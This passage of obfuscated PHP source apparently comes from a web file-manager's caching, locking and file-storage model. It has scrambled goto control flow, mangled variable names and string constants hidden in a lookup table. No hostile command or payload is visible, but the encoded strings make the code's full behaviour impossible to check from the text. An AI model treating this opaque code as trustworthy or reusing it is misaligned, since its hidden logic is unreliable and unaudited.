getUserJobInfo($bô»ê¥Ê”Ù) { goto F‘á•†­ÑÑ; f™ ÂÉİù£: $e—¦ëèÉ‘ô = array_remove_key($e—¦ëèÉ‘ô, $dóÄˆ°è[192]); $DÈÌò†İ = array(); foreach ($cï”•œ±¸Å as $Dˆ†Å‚ç²ê) { if (isset($e—¦ëèÉ‘ô[$Dˆ†Å‚ç²ê])) { $DÈÌò†İ[] = $e—¦ëèÉ‘ô[$Dˆ†Å‚ç²ê]; } } goto DÔÃ‰ÖßÀ„; F‘á•†­ÑÑ: $dóÄˆ°è =& $_SERVER[òÀöí]; $cï”•œ±¸Å = explode($dóÄˆ°è[47], $bô»ê¥Ê”Ù); $e—¦ëèÉ‘ô = parent::listData(); goto f™ ÂÉİù£; DÔÃ‰ÖßÀ„: return $DÈÌò†İ; goto AÅâ†Šê¶; AÅâ†Šê¶: } } goto bøÚœ¶œ˜; B¯ƒÃ£Ü¢‰: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FÏ‘˜Úœ”, $BíŒâ¯áÂÔ) { $fŸÆí„»èÚ =& $_SERVER[òÀöí]; $this->cachePath = $FÏ‘˜Úœ”[$fŸÆí„»èÚ[75]]; $this->prefix = $fŸÆí„»èÚ[787]; $this->cacheTime = $BíŒâ¯áÂÔ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($f”ğòğÄè) { $b‹•°Ëà…Œ =& $_SERVER[òÀöí]; $f”ğòğÄè = str_replace(array($b‹•°Ëà…Œ[788], $b‹•°Ëà…Œ[96], $b‹•°Ëà…Œ[69]), $b‹•°Ëà…Œ[789], $f”ğòğÄè); return $this->cachePath . $b‹•°Ëà…Œ[790] . $f”ğòğÄè . $b‹•°Ëà…Œ[791]; } public function set($eŞÓˆĞ²éÁ, $DÀØ‘Ì™‹®, $cÉ«äÎáã‹ = false) { $AÚµ—óõÛğ = $this->getFile($eŞÓˆĞ²éÁ); if (file_put_contents($AÚµ—óõÛğ, $this->prefix . $DÀØ‘Ì™‹®, LOCK_EX)) { return !0; } @unlink($AÚµ—óõÛğ); return !1; } public function get($eóõ•ÕñÚÇ) { $f“ô¾˜â×Â = $this->getFile($eóõ•ÕñÚÇ); if (file_exists($f“ô¾˜â×Â) && filemtime($f“ô¾˜â×Â) < time() - $this->cacheTime) { @unlink($f“ô¾˜â×Â); return !1; } $bÄôˆ¤§º = @file_get_contents($f“ô¾˜â×Â); return substr($bÄôˆ¤§º, strlen($this->prefix)); } public function remove($d—‡ˆº‡í‘) { $B ¢õÊÒ§ƒ = $this->getFile($d—‡ˆº‡í‘); return @unlink($B ¢õÊÒ§ƒ); } public function deleteAll() { $f‹óæññ´ =& $_SERVER[òÀöí]; $díÔÊÑÒÇ£ = scandir($this->cachePath); foreach ($díÔÊÑÒÇ£ as $còİâğ¼òã) { $DØƒÀÃ–Ùğ = $this->cachePath . $còİâğ¼òã; if (strpos($DØƒÀÃ–Ùğ, $f‹óæññ´[791]) && strpos($DØƒÀÃ–Ùğ, $f‹óæññ´[792])) { @unlink($DØƒÀÃ–Ùğ); } } } public function clearTimeout() { $DíøˆÓùŞ =& $_SERVER[òÀöí]; $Aƒë–İ°ÚŞ = scandir($this->cachePath); foreach ($Aƒë–İ°ÚŞ as $EÉËªÎ) { $DÏÉ³„Œ¢Ğ = $this->cachePath . $EÉËªÎ; if (strpos($DÏÉ³„Œ¢Ğ, $DíøˆÓùŞ[791]) && strpos($DÏÉ³„Œ¢Ğ, $DíøˆÓùŞ[792]) && filemtime($DÏÉ³„Œ¢Ğ) < time() - $this->cacheTime) { @unlink($DÏÉ³„Œ¢Ğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c®‘·ÁÕùÀ; d¤èµŸíÀÙ: self::$timeout = $FªÆ‡åÏîñ[$C¸ŠÓöËš¦[793]] ? $FªÆ‡åÏîñ[$C¸ŠÓöËš¦[793]] : 10; $cùæõ–„Ë• = _get($GLOBALS[$C¸ŠÓöËš¦[6]], $C¸ŠÓöËš¦[794]); $Bòœ¥í´ = $FªÆ‡åÏîñ[$C¸ŠÓöËš¦[780]] ? $FªÆ‡åÏîñ[$C¸ŠÓöËš¦[780]] : $C¸ŠÓöËš¦[173]; goto fù£ ¶«•; c®‘·ÁÕùÀ: $C¸ŠÓöËš¦ =& $_SERVER[òÀöí]; if (self::$handle) { return self::$handle; } $FªÆ‡åÏîñ = $GLOBALS[$C¸ŠÓöËš¦[6]][$C¸ŠÓöËš¦[345]]; goto d¤èµŸíÀÙ; fù£ ¶«•: if ($Bòœ¥í´ == $C¸ŠÓöËš¦[17] && $cùæõ–„Ë• == $C¸ŠÓöËš¦[9]) { $Bòœ¥í´ = $C¸ŠÓöËš¦[173]; } switch ($Bòœ¥í´) { case $C¸ŠÓöËš¦[783]: self::$handle = new CacheLockRedis(); break; case $C¸ŠÓöËš¦[784]: self::$handle = new CacheLockMemcached(); break; case $C¸ŠÓöËš¦[17]: self::$handle = new CacheLockDatabase(); break; case $C¸ŠÓöËš¦[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto DÑÏÖæ¦„»; DÑÏÖæ¦„»: } private static function key($A¶¨ÆÙ½ÈÂ) { return $_SERVER[òÀöí][795] . Cache::key($A¶¨ÆÙ½ÈÂ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fÓãæîó’Â = '') { self::$errorMsg = $fÓãæîó’Â; } public static function lockGlobal($B„±Œ¹ğ , $CÒËÃÔÂæ) { return self::lock($B„±Œ¹ğ , $CÒËÃÔÂæ, !0); } public static function lock($F¾ç¹±ä¹à, $Få„Ü‡¬Ğµ = false, $cÇÃîÑ™ç‹ = false) { goto b÷†ğŞ¨Ü; b÷†ğŞ¨Ü: $Aí¨¢Ö¤‹‘ =& $_SERVER[òÀöí]; $FÊˆôºƒ«ï = self::init(); $C©„¹Ù©Ÿ˜ = self::key($F¾ç¹±ä¹à); goto a†ŒÈ‚øšÒ; a†ŒÈ‚øšÒ: $Få„Ü‡¬Ğµ = $Få„Ü‡¬Ğµ ? $Få„Ü‡¬Ğµ : self::$timeout; $cìä‰ ÍĞ¬ = $FÊˆôºƒ«ï->lock($C©„¹Ù©Ÿ˜, $Få„Ü‡¬Ğµ); if (!$cìä‰ ÍĞ¬) { $d‘ƒ„“ˆˆğ = "\x6c\157\x63\153\40\x65\162\x72\157\162\73\153\x65\x79\75{$C©„¹Ù©Ÿ˜}\x3b\164\151\x6d\x65\75{$Få„Ü‡¬Ğµ}\x3b" . self::$errorMsg . $Aí¨¢Ö¤‹‘[67] . get_caller_msg(); $A‡¡äö‚ = LNG($Aí¨¢Ö¤‹‘[796]) . "\50{$Få„Ü‡¬Ğµ}\x73\x29\x2e" . LNG($Aí¨¢Ö¤‹‘[797]); $A‡¡äö‚ .= $Aí¨¢Ö¤‹‘[798]; if (is_string(self::$errorMsg) && self::$errorMsg) { $A‡¡äö‚ = $A‡¡äö‚ . $Aí¨¢Ö¤‹‘[799] . self::$errorMsg; } write_log($d‘ƒ„“ˆˆğ, $Aí¨¢Ö¤‹‘[800]); show_json($A‡¡äö‚, !1); } goto bÒÉÏ«ƒ‘ñ; bÒÉÏ«ƒ‘ñ: if (!$cÇÃîÑ™ç‹) { self::$lockItem[$C©„¹Ù©Ÿ˜] = !0; } return $cìä‰ ÍĞ¬; goto a‡‚È«óÁ; a‡‚È«óÁ: } public static function lockGet($b¢Ù‹ôƒ†) { $Fç¡¿†ñ÷É = self::key($b¢Ù‹ôƒ†); if (self::$lockItem[$Fç¡¿†ñ÷É]) { return self::$lockItem[$Fç¡¿†ñ÷É]; } return self::init()->lockGet($Fç¡¿†ñ÷É); } public static function unlock($EáÅæÑìáá) { $AåÔİº’½ = self::key($EáÅæÑìáá); self::$lockItem[$AåÔİº’½] = null; return self::init()->unlock($AåÔİº’½); } public static function unlockRuntime() { $EÀİæè”«¦ =& $_SERVER[òÀöí]; $e½Ááİ”øŠ = self::init(); $F‹ˆŸ©ÖÑé = !1; foreach (self::$lockItem as $e¦œ¬‹Äí => $CÚ®›»¦õ†) { if (!$CÚ®›»¦õ†) { continue; } $e½Ááİ”øŠ->unlock($e¦œ¬‹Äí); if (!$F‹ˆŸ©ÖÑé) { $F‹ˆŸ©ÖÑé = !0; write_log($EÀİæè”«¦[801] . $e¦œ¬‹Äí . $EÀİæè”«¦[67] . get_caller_msg(), $EÀİæè”«¦[800]); continue; } write_log($EÀİæè”«¦[801] . $e¦œ¬‹Äí, $EÀİæè”«¦[800]); } self::fileUnlockAll(); } public static function fileLock($Eº¿•“©Œ×) { goto E¬Ï¼›ÒŠˆ; E¬Ï¼›ÒŠˆ: $e¬‚êÛ‡  =& $_SERVER[òÀöí]; if (!$GLOBALS[$e¬‚êÛ‡ [802]]) { $GLOBALS[$e¬‚êÛ‡ [802]] = array(); } $GLOBALS[$e¬‚êÛ‡ [802]][$Eº¿•“©Œ×] = !1; goto cšÕ­Ì¸îµ; cšÕ­Ì¸îµ: $cÎŠ³´Á¹ê = fopen(DATA_PATH . $Eº¿•“©Œ× . $e¬‚êÛ‡ [803], $e¬‚êÛ‡ [804]); if (!$cÎŠ³´Á¹ê) { return !1; } $GLOBALS[$e¬‚êÛ‡ [802]][$Eº¿•“©Œ×] = $cÎŠ³´Á¹ê; goto A°ÓŠ¹ğ¢™; d–Š¿ÌéùĞ: return !1; goto CŠÕìÏ‚©; A°ÓŠ¹ğ¢™: if (flock($cÎŠ³´Á¹ê, LOCK_EX)) { return !0; } self::unlock($Eº¿•“©Œ×); show_json($e¬‚êÛ‡ [805], !1); goto d–Š¿ÌéùĞ; CŠÕìÏ‚©: } public static function fileUnlock($fË©·‡Ê¾») { $fÇ÷ó—÷²º =& $_SERVER[òÀöí]; $b„ğÈÊ¸ = $GLOBALS[$fÇ÷ó—÷²º[802]][$fË©·‡Ê¾»]; if (!$b„ğÈÊ¸) { return; } $GLOBALS[$fÇ÷ó—÷²º[802]][$fË©·‡Ê¾»] = !1; flock($b„ğÈÊ¸, LOCK_UN); fclose($b„ğÈÊ¸); } public static function fileUnlockAll() { $d‘Ù˜ˆÁ¦¼ =& $_SERVER[òÀöí]; if (!$GLOBALS[$d‘Ù˜ˆÁ¦¼[802]]) { return; } foreach ($GLOBALS[$d‘Ù˜ˆÁ¦¼[802]] as $A°œŸ½ÜÚÚ => $c¿±Ê ëÍ) { if (!$c¿±Ê ëÍ) { continue; } $GLOBALS[$d‘Ù˜ˆÁ¦¼[802]][$A°œŸ½ÜÚÚ] = !1; flock($c¿±Ê ëÍ, LOCK_UN); fclose($c¿±Ê ëÍ); } $GLOBALS[$d‘Ù˜ˆÁ¦¼[802]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto EÇ©ù÷•ñÜ; e›Ù®§œ÷’: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($f±¹­óíøß) { $d ê´Çóôâ =& $_SERVER[òÀöí]; $aŠâŠŠß¢Ì = Model($d ê´Çóôâ[492])->where(array($d ê´Çóôâ[1496] => $f±¹­óíøß))->find(); $Fİˆ±¿¡õè = $this->_mkdirRoot(SourceModel::TYPE_USER, $f±¹­óíøß, $aŠâŠŠß¢Ì[$d ê´Çóôâ[28]]); $this->userDesktopAdd($Fİˆ±¿¡õè); return $Fİˆ±¿¡õè; } public function userDesktopAdd($d—â¸áØÌ) { $a÷ä±Ì«« =& $_SERVER[òÀöí]; $FÊôƒ›±‡ = LNG($a÷ä±Ì««[1922]); $E¥í•Ÿ“ = $this->mkdir($d—â¸áØÌ, $FÊôƒ›±‡); $this->metaSet($E¥í•Ÿ“, $a÷ä±Ì««[1923], $a÷ä±Ì««[86]); $this->metaSet($d—â¸áØÌ, $a÷ä±Ì««[1924], $E¥í•Ÿ“); } public function groupRootAdd($CÑ‘ÎĞî›) { $aÆåäªã®º =& $_SERVER[òÀöí]; $b˜–ØŞÔÏ‰ = Model($aÆåäªã®º[476])->where(array($aÆåäªã®º[1744] => $CÑ‘ÎĞî›))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $CÑ‘ÎĞî›, $b˜–ØŞÔÏ‰[$aÆåäªã®º[28]]); } public function systemRootPathAdd($dÉöÌóòèš) { if ($dÉöÌóòèš != $_SERVER[òÀöí][1153]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $dÉöÌóòèš); } public function userRootRemove($DÃîÅÓ£‹¤) { $F½ïÖøù­á = $this->sourceRoot(SourceModel::TYPE_USER, $DÃîÅÓ£‹¤); if (!$F½ïÖøù­á) { return; } $this->remove($F½ïÖøù­á, !1); } public function groupRootRemove($cã·„íå ¬) { $cŸõóˆÉŠõ = $this->sourceRoot(SourceModel::TYPE_GROUP, $cã·„íå ¬); if (!$cŸõóˆÉŠõ) { return; } $this->remove($cŸõóˆÉŠõ, !1); } private function _mkdirRoot($aÙ‚ÉµåÇ¯, $Bº°‰òáé¼, $aÒ°„¹”ïÂ) { goto A§Ö¦îìó©; aØåˆ¸ ¶: $CáæàŒ¨…² = $this->add($dÀ“Ş÷½¸÷); $BÜŒªÂ§¿ = array($d©°È‡¤éË[544] => short_id($CáæàŒ¨…²)); $this->where(array($d©°È‡¤éË[401] => $CáæàŒ¨…²))->save($BÜŒªÂ§¿); goto bÙ«‚¨èôÄ; A§Ö¦îìó©: $d©°È‡¤éË =& $_SERVER[òÀöí]; $dÀ“Ş÷½¸÷ = array($d©°È‡¤éË[386] => 0, $d©°È‡¤éË[538] => $aÙ‚ÉµåÇ¯, $d©°È‡¤éË[539] => $Bº°‰òáé¼, $d©°È‡¤éË[535] => 1, $d©°È‡¤éË[540] => USER_ID, $d©°È‡¤éË[541] => USER_ID, $d©°È‡¤éË[536] => $d©°È‡¤éË[33], $d©°È‡¤éË[542] => $d©°È‡¤éË[488], $d©°È‡¤éË[413] => 0, $d©°È‡¤éË[537] => 0, $d©°È‡¤éË[437] => 0, $d©°È‡¤éË[543] => $d©°È‡¤éË[33]); if ($EóÇ©­Ç = $this->where($dÀ“Ş÷½¸÷)->find()) { return $EóÇ©­Ç[$d©°È‡¤éË[387]]; } goto F‚á´ÅÛîŒ; bÙ«‚¨èôÄ: CacheLock::unlock($DÚ­äÅ¢åô); return $CáæàŒ¨…²; goto DŠ‘‹ÖÊ¦ª; F‚á´ÅÛîŒ: $DÚ­äÅ¢åô = "\x4d\x6f\144\x65\154\x53\157\165\x72\143\x65\56\x6d\153\x64\151\x72\x52\157\157\164\x2e{$aÙ‚ÉµåÇ¯}\56{$Bº°‰òáé¼}\x2e" . $aÒ°„¹”ïÂ; CacheLock::lock($DÚ­äÅ¢åô); $dÀ“Ş÷½¸÷[$d©°È‡¤éË[28]] = $aÒ°„¹”ïÂ; goto aØåˆ¸ ¶; DŠ‘‹ÖÊ¦ª: } private function sourceRoot($d³ÏèÜª«¢, $bÎ·«Æğôé, $Eä¯œ»‹˜é = false) { $aÌÓõ¤ØŸÜ =& $_SERVER[òÀöí]; $C«íö®’Ù§ = array($aÌÓõ¤ØŸÜ[386] => 0, $aÌÓõ¤ØŸÜ[538] => $d³ÏèÜª«¢, $aÌÓõ¤ØŸÜ[539] => $bÎ·«Æğôé); if ($A ŸÄÜôõÜ = $this->where($C«íö®’Ù§)->find()) { return $Eä¯œ»‹˜é ? $A ŸÄÜôõÜ : $A ŸÄÜôõÜ[$aÌÓõ¤ØŸÜ[387]]; } return !1; } public function sourceRootGroup($B—¦µ™òï) { $BâĞ„ƒëÊº =& $_SERVER[òÀöí]; if (is_string($B—¦µ™òï)) { $B—¦µ™òï = array($B—¦µ™òï); } $FâÄ–»²¨ = array($BâĞ„ƒëÊº[386] => 0, $BâĞ„ƒëÊº[538] => SourceModel::TYPE_GROUP, $BâĞ„ƒëÊº[539] => array($BâĞ„ƒëÊº[7], $B—¦µ™òï)); $A…ß˜½Ö½Î = $this->listSource($FâÄ–»²¨, 1000); return array_to_keyvalue($A…ß˜½Ö½Î[$BâĞ„ƒëÊº[74]], $BâĞ„ƒëÊº[474]); } public function mkfile($c‚”ôŠáÆ, $Bù˜ö—½«, $DÜëó÷¯¨¾ = '', $AŠÏ¾Ç¯·° = REPEAT_RENAME) { $CïÈôØÈ¤Œ =& $_SERVER[òÀöí]; $a»ôêõƒ£ = Model($CïÈôØÈ¤Œ[560])->addFileByContent($DÜëó÷¯¨¾, $Bù˜ö—½«); return $this->_createFileCall($c‚”ôŠáÆ, $Bù˜ö—½«, $a»ôêõƒ£, $AŠÏ¾Ç¯·°, $CïÈôØÈ¤Œ[1190]); } public function addFile($C‡›¹„¯†¼, $CùİèË¤ÕÁ, $dÈ¸©˜ÃÅó, $CöæÇÍ¼ = false, $a„‡×ëãƒ = REPEAT_RENAME) { $f–“ŠÚ÷ˆ = Model($_SERVER[òÀöí][560])->addFile($CùİèË¤ÕÁ, $dÈ¸©˜ÃÅó, $CöæÇÍ¼); return $this->_createFileCall($C‡›¹„¯†¼, $dÈ¸©˜ÃÅó, $f–“ŠÚ÷ˆ, $a„‡×ëãƒ); } public function addFileByFileID($Aêî¬š˜×ª, $A‚©†×‰Õ, $Bªåí¦Ø, $A£÷Öö‰É = REPEAT_RENAME) { $e˜áâí„† =& $_SERVER[òÀöí]; $b¤¬–‚ÌÁ¸ = Model($e˜áâí„†[560])->find($A‚©†×‰Õ); Model($e˜áâí„†[560])->linkAdd($A‚©†×‰Õ); return $this->_createFileCall($Aêî¬š˜×ª, $Bªåí¦Ø, $b¤¬–‚ÌÁ¸, $A£÷Öö‰É); } public function addFileByRemote($DÖÊÖÑá«ë, $b‘´âá‰éå, $EˆäØã ˜ï, $dÜÀæÏí–Ï = array(), $fÃ…éËæâ = REPEAT_RENAME) { $dàë¥ªİÅ = Model($_SERVER[òÀöí][560])->addFileByRemote($b‘´âá‰éå, $EˆäØã ˜ï, $dÜÀæÏí–Ï); return $this->_createFileCall($DÖÊÖÑá«ë, $EˆäØã ˜ï, $dàë¥ªİÅ, $fÃ…éËæâ); } private function _createFileCall($e‰­›İ‡¿•, $A‘ì—‰¾õé, $B„Ùç –Ò, $cˆŠ¸´ë‚ , $Cá÷†ÁÍè = "\165\x70\x6c\x6f\141\x64") { goto FÂ¿ïÍ•©÷; BŒ»®íºñ¡: $Bƒ³‚¼—µ” = $this->fileNameExist($e‰­›İ‡¿•, $A‘ì—‰¾õé); $F±ÒøÙ÷ = $this->_createFile($e‰­›İ‡¿•, $A‘ì—‰¾õé, $B„Ùç –Ò, $cˆŠ¸´ë‚ , $EÒ†Ò„Ã•Í); if (!$EÒ†Ò„Ã•Í) { Model($b“—†õÓ³[439])->remove($B„Ùç –Ò[$b“—†õÓ³[436]]); } goto F…ä²ÄÈ®ø; FÂ¿ïÍ•©÷: $b“—†õÓ³ =& $_SERVER[òÀöí]; $EÒ†Ò„Ã•Í = !1; $this->lockWriteStart($e‰­›İ‡¿•, $A‘ì—‰¾õé); goto BŒ»®íºñ¡; F…ä²ÄÈ®ø: if ($EÒ†Ò„Ã•Í && $F±ÒøÙ÷ && $F±ÒøÙ÷ != $Bƒ³‚¼—µ”) { Model($b“—†õÓ³[1894])->eventCreate($F±ÒøÙ÷, $Cá÷†ÁÍè); } $this->lockWriteEnd($e‰­›İ‡¿•, $A‘ì—‰¾õé); return $F±ÒøÙ÷; goto f—……’ê·; f—……’ê·: } public function mkdir($F‘ä³ôßÇš, $E¤Ó†çóê­, $FöØ‚ÚÁ¡ë = REPEAT_SKIP) { goto EåÅÖŠ‹…; EåÅÖŠ‹…: $d¾™··¾ç£ =& $_SERVER[òÀöí]; $FØá²ÎËİ– = $this->sourceInfo($F‘ä³ôßÇš); if (!$FØá²ÎËİ–) { return !1; } goto DÏœ…Å¡×ï; DÏœ…Å¡×ï: $this->lockWriteStart($F‘ä³ôßÇš, $E¤Ó†çóê­); if ($FöØ‚ÚÁ¡ë !== !1) { $dËŸİÊãÉï = $this->fileNameExist($F‘ä³ôßÇš, $E¤Ó†çóê­); if ($dËŸİÊãÉï && $FöØ‚ÚÁ¡ë != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($F‘ä³ôßÇš, $E¤Ó†çóê­); return $dËŸİÊãÉï; } $E¤Ó†çóê­ = $this->fileNameAuto($F‘ä³ôßÇš, $E¤Ó†çóê­, $FöØ‚ÚÁ¡ë); } $E§‰¨Úùˆ = array($d¾™··¾ç£[535] => 1, $d¾™··¾ç£[404] => $E¤Ó†çóê­, $d¾™··¾ç£[536] => $d¾™··¾ç£[33], $d¾™··¾ç£[437] => 0, $d¾™··¾ç£[537] => 0); goto F‚ù‹å…²Á; BóÔŠˆ¯ŠÄ: return $AôìŒÌ±Ó÷; goto e‘×ÌåÈ¢ç; F‚ù‹å…²Á: $AôìŒÌ±Ó÷ = $this->_addSoure($E§‰¨Úùˆ, $FØá²ÎËİ–); Model($d¾™··¾ç£[1894])->eventCreate($AôìŒÌ±Ó÷, $d¾™··¾ç£[1191]); $this->lockWriteEnd($F‘ä³ôßÇš, $E¤Ó†çóê­); goto BóÔŠˆ¯ŠÄ; e‘×ÌåÈ¢ç: } private function _createFile($AÜ…™½ª²ª, $D¸²î•‰£, $e•‰¥Ì‚©ç, $Eô÷¼Í×œ¿, &$f³ÙƒÍÁİÀ) { goto b•¢÷˜Æ½Õ; cƒğ‘´æªÍ: if ($Eô÷¼Í×œ¿ !== !1) { $eùÄÔÃĞÀØ = $this->fileNameExist($AÜ…™½ª²ª, $D¸²î•‰£); } $f³ÙƒÍÁİÀ = !0; if ($Eô÷¼Í×œ¿ && $eùÄÔÃĞÀØ) { if ($Eô÷¼Í×œ¿ == REPEAT_SKIP) { $f³ÙƒÍÁİÀ = !1; return $eùÄÔÃĞÀØ; } else { if ($Eô÷¼Í×œ¿ == REPEAT_REPLACE) { $d“Ìî‹Ëê‹ = $this->sourceInfo($eùÄÔÃĞÀØ); $AµÂÏ˜šÎğ = $this->fileHistory($d“Ìî‹Ëê‹, $e•‰¥Ì‚©ç[$CÈÔ­œ£â[436]], $e•‰¥Ì‚©ç[$CÈÔ­œ£â[77]]); if (!$AµÂÏ˜šÎğ) { $f³ÙƒÍÁİÀ = !1; } else { $this->folderSizeReset($AÜ…™½ª²ª); } return $eùÄÔÃĞÀØ; } else { $D¸²î•‰£ = $this->fileNameAuto($AÜ…™½ª²ª, $D¸²î•‰£, $Eô÷¼Í×œ¿, !1); } } } goto FáÒŸ×‡ùì; b•¢÷˜Æ½Õ: $CÈÔ­œ£â =& $_SERVER[òÀöí]; $F‡±äŞÖ¡Õ = $this->sourceInfo($AÜ…™½ª²ª); if (!$e•‰¥Ì‚©ç || !$F‡±äŞÖ¡Õ) { return !1; } goto cƒğ‘´æªÍ; F³ö»…Ô­: return $Eïì£ì…Ÿ†; goto CÓ¦éí‡Ş; FáÒŸ×‡ùì: $B›÷è™é¼« = array($CÈÔ­œ£â[535] => 0, $CÈÔ­œ£â[404] => $D¸²î•‰£, $CÈÔ­œ£â[536] => get_path_ext($D¸²î•‰£), $CÈÔ­œ£â[437] => $e•‰¥Ì‚©ç[$CÈÔ­œ£â[436]], $CÈÔ­œ£â[537] => $e•‰¥Ì‚©ç[$CÈÔ­œ£â[77]]); $Eïì£ì…Ÿ† = $this->_addSoure($B›÷è™é¼«, $F‡±äŞÖ¡Õ); $this->folderSizeReset($AÜ…™½ª²ª, intval($B›÷è™é¼«[$CÈÔ­œ£â[77]])); goto F³ö»…Ô­; CÓ¦éí‡Ş: } protected function fileHistory($C¹ˆËËŠÎ¬, $fÒ¿ÔÜºÎ, $E‰¦åŠ³²ò) { goto Cô¾Ç÷æò; Cô¾Ç÷æò: $bœœĞòÈâ =& $_SERVER[òÀöí]; if ($C¹ˆËËŠÎ¬[$bœœĞòÈâ[436]] == $fÒ¿ÔÜºÎ) { return !1; } $this->checkLock($C¹ˆËËŠÎ¬[$bœœĞòÈâ[387]], $fÒ¿ÔÜºÎ); goto c¡æñõ; BëÑ™Ç…ÓÁ: $this->sourceCacheClear($C¹ˆËËŠÎ¬[$bœœĞòÈâ[387]]); return !0; goto cÒ×ÜÓÌ²©; c¡æñõ: Model($bœœĞòÈâ[1925])->addHistory($C¹ˆËËŠÎ¬); $c±‚Ìô¹Áƒ = array($bœœĞòÈâ[541] => USER_ID, $bœœĞòÈâ[408] => time(), $bœœĞòÈâ[436] => $fÒ¿ÔÜºÎ, $bœœĞòÈâ[77] => $E‰¦åŠ³²ò); $this->where(array($bœœĞòÈâ[401] => $C¹ˆËËŠÎ¬[$bœœĞòÈâ[387]]))->save($c±‚Ìô¹Áƒ); goto BëÑ™Ç…ÓÁ; cÒ×ÜÓÌ²©: } public function checkLock($aÎ·‚ƒ–óë, $C¥ÄçéÇç) { goto F¨Áëà…—; fåÔÍ”ÒĞÉ: $f’Å¸Ã‡ß» = Session::get($D¶ÛØª›±ß[1926]); $C£œò‡Ç¨Ä = substr($B‹Œƒ…ßˆ[$D¶ÛØª›±ß[28]], 0, -1 - strlen($B‹Œƒ…ßˆ[$D¶ÛØª›±ß[167]])) . $D¶ÛØª›±ß[1456] . $f’Å¸Ã‡ß» . $D¶ÛØª›±ß[94] . $B‹Œƒ…ßˆ[$D¶ÛØª›±ß[167]]; $BåòÅ‘š‚² = Model($D¶ÛØª›±ß[560])->find($C¥ÄçéÇç); goto D±Çß¾‘”Ÿ; D±Çß¾‘”Ÿ: $this->_createFileCall($B‹Œƒ…ßˆ[$D¶ÛØª›±ß[479]], $C£œò‡Ç¨Ä, $BåòÅ‘š‚², REPEAT_REPLACE, $D¶ÛØª›±ß[1190]); $câÚĞöïÜ = $B‹Œƒ…ßˆ[$D¶ÛØª›±ß[434]][$D¶ÛØª›±ß[499]]; $eë•‡ŒŒóŠ = $câÚĞöïÜ[$D¶ÛØª›±ß[1927]] ? $câÚĞöïÜ[$D¶ÛØª›±ß[1927]] : $câÚĞöïÜ[$D¶ÛØª›±ß[28]]; goto bè«ùà…ˆ¯; bè«ùà…ˆ¯: show_json(LNG($D¶ÛØª›±ß[1928]) . $D¶ÛØª›±ß[1929] . LNG($D¶ÛØª›±ß[1930]) . $D¶ÛØª›±ß[1931] . $eë•‡ŒŒóŠ . $D¶ÛØª›±ß[1932], !1); goto Bºê´¦¥œ; F¨Áëà…—: $D¶ÛØª›±ß =& $_SERVER[òÀöí]; $B‹Œƒ…ßˆ = $this->pathInfo($aÎ·‚ƒ–óë); if (!$this->fileIsLock($B‹Œƒ…ßˆ, !0)) { return; } goto fåÔÍ”ÒĞÉ; Bºê´¦¥œ: } public function fileIsLock($BÍ¼ñ¾å›, $cÄƒöèêí‹ = false) { goto dÆéåÜö; cˆß¸çŸ·Ö: return !1; goto B°…‡›‘‘«; dÆéåÜö: $B‚•¸…ôç… =& $_SERVER[òÀöí]; if (!isset($BÍ¼ñ¾å›[$B‚•¸…ôç…[434]]) || !$BÍ¼ñ¾å›[$B‚•¸…ôç…[434]][$B‚•¸…ôç…[496]]) { return !1; } if ($BÍ¼ñ¾å›[$B‚•¸…ôç…[434]][$B‚•¸…ôç…[496]] != USER_ID) { return !0; } goto b•¦‹ãÄ‡¹; b•¦‹ãÄ‡¹: $d¼¸¹†í¶ = $GLOBALS[$B‚•¸…ôç…[6]][$B‚•¸…ôç…[87]][$B‚•¸…ôç…[497]]; if ($BÍ¼ñ¾å›[$B‚•¸…ôç…[434]][$B‚•¸…ôç…[498]] <= time() - $d¼¸¹†í¶) { $this->metaSet($BÍ¼ñ¾å›[$B‚•¸…ôç…[387]], $B‚•¸…ôç…[496], null); $this->metaSet($BÍ¼ñ¾å›[$B‚•¸…ôç…[387]], $B‚•¸…ôç…[498], null); } if ($cÄƒöèêí‹) { $this->metaSet($BÍ¼ñ¾å›[$B‚•¸…ôç…[387]], $B‚•¸…ôç…[498], time()); } goto cˆß¸çŸ·Ö; B°…‡›‘‘«: } private function _addSoure($C ˜¨øšš‡, $cØô æ³Ä­) { goto dÄ¦åá”¸İ; a¢Œ¤óÏÄå: static $DŸÊ¡Õµî = false; if (!$DŸÊ¡Õµî) { Hook::trigger($cİ°Ó¦âÌä[525], $C ˜¨øšš‡); $DŸÊ¡Õµî = !0; } $bÒ¹‡¡˜¨ = $this->add($C ˜¨øšš‡); goto e»´ƒ›¶ç¨; e»´ƒ›¶ç¨: $AœĞµµçˆ… = array($cİ°Ó¦âÌä[544] => short_id($bÒ¹‡¡˜¨)); $this->where(array($cİ°Ó¦âÌä[401] => $bÒ¹‡¡˜¨))->save($AœĞµµçˆ…); $this->setNamePinyin($bÒ¹‡¡˜¨, $C ˜¨øšš‡[$cİ°Ó¦âÌä[28]]); goto b²™Íç«ê¸; dÄ¦åá”¸İ: $cİ°Ó¦âÌä =& $_SERVER[òÀöí]; $DÂÍïÜ°‡ = array($cİ°Ó¦âÌä[538] => $cØô æ³Ä­[$cİ°Ó¦âÌä[389]], $cİ°Ó¦âÌä[539] => $cØô æ³Ä­[$cİ°Ó¦âÌä[474]], $cİ°Ó¦âÌä[540] => USER_ID, $cİ°Ó¦âÌä[541] => USER_ID, $cİ°Ó¦âÌä[386] => $cØô æ³Ä­[$cİ°Ó¦âÌä[387]], $cİ°Ó¦âÌä[542] => $cØô æ³Ä­[$cİ°Ó¦âÌä[477]] . $cØô æ³Ä­[$cİ°Ó¦âÌä[387]] . $cİ°Ó¦âÌä[47], $cİ°Ó¦âÌä[413] => 0, $cİ°Ó¦âÌä[543] => $cİ°Ó¦âÌä[33]); $C ˜¨øšš‡ = array_merge($DÂÍïÜ°‡, $C ˜¨øšš‡); goto E’·…ñ¹É; E’·…ñ¹É: $this->updateModifyTime($C ˜¨øšš‡[$cİ°Ó¦âÌä[479]]); 